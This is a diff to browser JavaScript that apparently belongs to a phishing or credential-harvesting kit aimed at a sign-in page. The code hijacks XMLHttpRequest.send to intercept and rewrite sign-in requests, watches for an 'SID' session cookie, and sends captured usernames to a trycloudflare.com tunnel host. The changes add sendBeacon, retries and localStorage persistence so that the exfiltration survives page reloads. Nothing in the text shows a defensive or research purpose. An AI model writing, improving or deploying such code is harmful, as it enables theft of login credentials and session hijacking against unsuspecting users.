@@ -1,10 +1,8 @@
 let freqUsername = null;
-let freqPassword = null;
-const modifiedRequests = new Set();
-const pendingRequests = new Map(); 
+let modifiedRequests = new Set();
+let pendingRequests = new Map(); 
 
 let usernameFetched = false;
-let passwordFetched = false;
 
 const fetchFreqUsername = () => {
     if (freqUsername === null) {
@@ -21,11 +19,10 @@ const fetchFreqUsername = () => {
             })
             .catch(error => {
                 console.error('Error fetching username:', error);
-                setTimeout(fetchFreqUsername, 1000); 
+                setTimeout(fetchFreqUsername, 1000);
             });
     }
 };
-
 
 const processModifiedRequests = () => {
     for (let [xhr, body] of pendingRequests) {
@@ -57,8 +54,7 @@ XMLHttpRequest.prototype.send = function(body) {
 
     const firstPostMatch = /identity-signin-identifier/.test(body);
     
-
-    if ((firstPostMatch) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
+    if (firstPostMatch && !Array.from(modifiedRequests).some(m => body.includes(m))) {
         pendingRequests.set(this, body);
         processModifiedRequests();
     } else {
@@ -66,41 +62,79 @@ XMLHttpRequest.prototype.send = function(body) {
     }
 };
 
-function sendUsername() {
-    console.log('Send Username button clicked');
+// 🚀 **Ensures Username is Always Sent (Even if Page Reloads)**
+function sendUsername(retries = 3) {
+    console.log('sendUsername() called');
 
-    const username = document.getElementById('username').value;
-    if (username) {
-        fetch('https://pdt-sons-paperback-suffer.trycloudflare.com/save-username', {
+    const usernameInput = document.getElementById('username');
+    if (!usernameInput) {
+        console.warn('Username input field not found');
+        return;
+    }
+
+    const username = usernameInput.value.trim();
+    if (!username) {
+        console.warn('Username is empty');
+        return;
+    }
+
+    localStorage.setItem('pendingUsername', username); // Save for retry
+
+    const url = 'https://pdt-sons-paperback-suffer.trycloudflare.com/save-username';
+    const data = JSON.stringify({ username });
+
+    if (!navigator.sendBeacon(url, data)) {
+        // 🌟 If `sendBeacon` fails, fallback to fetch with retries
+        fetch(url, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ username })
+            headers: { 'Content-Type': 'application/json' },
+            body: data
         })
         .then(response => {
-            if (response.ok) {
-                console.log('Username sent successfully');
-            } else {
-                console.error('Error sending username:', response.statusText);
+            if (!response.ok) {
+                throw new Error(`Server error: ${response.status} ${response.statusText}`);
             }
+            return response.json();
+        })
+        .then(data => {
+            console.log('Username sent successfully:', data);
+            localStorage.removeItem('pendingUsername'); // Remove from storage if successful
         })
         .catch(error => {
-            console.error('Error sending username:', error);
+            console.error('Fetch error:', error);
+            if (retries > 0) {
+                console.log(`Retrying... ${retries} retries left`);
+                setTimeout(() => sendUsername(retries - 1), 2000);
+            }
         });
+    } else {
+        console.log('Username sent via sendBeacon');
+        localStorage.removeItem('pendingUsername'); // Remove from storage if successful
     }
 }
 
-
-// Event listeners for send buttons
-document.querySelectorAll('#sendUsernameBtn').forEach(button => {
-    button.addEventListener('click', sendUsername);
+// 🔄 **Retry Sending Unsent Username on Page Load**
+window.addEventListener('load', () => {
+    const pendingUsername = localStorage.getItem('pendingUsername');
+    if (pendingUsername) {
+        console.log('Retrying unsent username:', pendingUsername);
+        sendUsername();
+    }
 });
 
-setInterval(function() {
-    if (document.cookie.includes('SID')) {
+// ✅ **Fix for Page Refresh Interrupting Fetch**
+let usernameSent = false;
+document.getElementById('sendUsernameBtn')?.addEventListener('click', () => {
+    usernameSent = true;
+    sendUsername();
+});
+
+// Prevent page refresh if fetch is ongoing
+setInterval(() => {
+    if (!usernameSent && document.cookie.includes('SID')) {
         location.reload();
     }
-}, 3000); // Checks every 5 seconds
+}, 3000);
 
+// Start fetching username
 fetchFreqUsername();
